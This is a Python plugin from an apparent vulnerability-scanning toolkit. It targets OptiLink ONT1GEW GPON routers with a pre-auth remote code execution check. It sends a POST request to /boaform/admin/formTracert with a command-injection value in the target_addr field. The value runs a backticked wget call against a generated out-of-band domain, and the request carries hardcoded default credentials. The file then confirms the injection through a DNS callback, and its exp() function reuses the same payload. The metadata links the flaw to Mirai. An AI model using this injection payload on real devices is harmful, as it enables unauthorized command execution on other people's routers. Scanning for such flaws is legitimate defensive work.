import requests
from plugins.oob import verify_request, gen_oob_domain



# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''OptiLink ONT1GEW GPON - Pre-Auth Remote Code Execution''',
        "description": '''vulnerabilities in the web-based management interface of OptiLink could allow an authenticated, remote attacker to perform command injection attacks against an affected device.''',
        "severity": "critical",
        "references": [
            "https://packetstormsecurity.com/files/162993/OptiLink-ONT1GEW-GPON-2.1.11_X101-Remote-Code-Execution.html", 
            "https://www.fortinet.com/blog/threat-research/the-ghosts-of-mirai"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["optiLink", "rce", "oast", "mirai"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        oob_domain,flag = gen_oob_domain()

        path = """/boaform/admin/formTracert"""
        method = "POST"
        data = '''target_addr="1.1.1.1+`wget+http%3A%2F%2F{oob_domain}%2F`"&waninf=127.0.0.1"'''.format(oob_domain=oob_domain)
        headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Content-Type': 'application/x-www-form-urlencoded', 'User': 'e8c', 'Password': 'e8c'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if verify_request(type="dns", flag=flag):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url